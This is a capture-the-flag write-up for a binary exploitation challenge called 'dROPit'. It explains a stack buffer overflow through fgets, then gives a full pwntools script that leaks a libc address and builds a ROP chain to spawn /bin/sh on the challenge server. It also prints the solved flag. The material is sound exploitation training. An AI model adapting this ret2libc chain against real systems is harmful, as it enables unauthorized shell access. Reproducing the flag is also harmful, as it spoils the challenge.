# dROPit

Category: Binary Exploitation, ropchain
Created: Nov 5, 2020 8:41 PM
Points: 300
Solved: Yes
Subjective Difficulty: 🔥🔥

# WriteUp:

## 🔎 Research:

We're given a dynamicly linked binary ELF file. 

## 📝 Vulnerability Description:

The program calls a vulnerable `fgets` function that could lead to a [BufferOverflow](https://www.notion.so/Binary-exploitation-6bb56af09d9f40d38b75dd4f66f74d27). 

## 🧠 Exploit Development:

We use the [ROP technique](https://www.notion.so/ROP-1fe7ddaabcfc44d6ae73745377e9007a) to call `system("/bin/sh")` . Though no useful ROP gadgets to execute syscalls are found, i decided to leak libc_puts address in [GOT](https://www.notion.so/GOT-e3101944e4cb498c9dcd337940fcecad) by returning to puts and populating rdi before through a founded gadget. The Gadgets are found with ropper.  With the leaked puts address i calculatet the libc_base address and from there the system call and `"/bin/sh"` string stored also in libc. Libc version and offsets are found through libc-database:

[libc-database](https://libc.rip/)

## 🔐 Exploit Programm:

```python
from pwn import *

ret = 0x40101a
pop_rdi = 0x401203
main_addr = 0x401146
puts_got = 0x403fc8
puts_plt = 0x401030

class Situation():
	@classmethod
	def get_payload2(cls, puts_addr):
		libc_base = puts_addr - cls.puts_offset
		print("libc_base: {0}".format(hex(libc_base)))
		system_addr = libc_base + cls.system_offset
		print("system_addr: {0}".format(hex(system_addr)))
		bin_sh_string_addr = libc_base + cls.bin_sh_string_offset
		print("bin_sh_string_addr: {0}".format(hex(bin_sh_string_addr)))
		return b"A"*48+b"BBBBBBBB"+p64(pop_rdi)+p64(bin_sh_string_addr)+p64(ret)+p64(system_addr)

class Remote(Situation):
	puts_offset = 0x80d90
	system_offset = 0x503c0
	bin_sh_string_offset = 0x1ae41f

class Local(Situation):
	puts_offset = 0x875a0
	system_offset = 0x55410
	bin_sh_string_offset = 0x1b75aa

payload1 = b"A"*48+b"BBBBBBBB"+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)

#p = process("./dropit")
p = remote("challenges.ctfd.io", 30261)

p.recvline() # ?
p.sendline(payload1)
puts_addr = int.from_bytes(p.recvline(keepends=False), "little")
print("puts_addr: {0}".format(hex(puts_addr)))
#p.interactive()

payload2 = Remote.get_payload2(puts_addr)

p.recvline() # ?
p.sendline(payload2)
p.interactive()
```

## 💥 Run Exploit:

![dROPit%20f012cc9d6bed46878f104d020e553496/Successfull_exploit.png](dROPit%20f012cc9d6bed46878f104d020e553496/Successfull_exploit.png)

**FLAG:  nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}**

## 🗄️ Summary / Difficulties:

This was a basic ROP exploitation challenge. Finding right libc version was kind of difficult cause local libc database was not up-to-date. 

→ Next times use online libc_database

## 🗃️ Further References:

- [GOT](https://www.notion.so/GOT-e3101944e4cb498c9dcd337940fcecad)
- [ROP](https://www.notion.so/ROP-1fe7ddaabcfc44d6ae73745377e9007a)
- [Stack based Buffer Overflows](https://www.notion.so/Stack-based-Buffer-Overflows-8659881fbfb141d0afaca02b247e123d)

## 🔨 Used Tools:

- [Pwndbg](https://www.notion.so/Pwndbg-2c0c6540dc5444559bb84545f6dbbd48)
- [Ropper](https://www.notion.so/Ropper-711ce6c597944ae38e77750c365d04ff)
- [Libc-Database](https://www.notion.so/Libc-Database-1299ef3982f34cc7afe0c7a03109172a)
- pwntools

# Topics:

---

# Notes / Ideas:

- **Leak libc address with puts@plt and then return to main → start again with call to system**
    - **use pop rdi gadget to leak __libc_start_main**
- ret2dl_resolve → aufwendig
- ret2csu to populate registers and jump to puts
    - leaking libc address and then calling system
    - read /bin/sh string through fgets in data segment and calling execve syscall (execve("/bin/sh\0", NULL, NULL))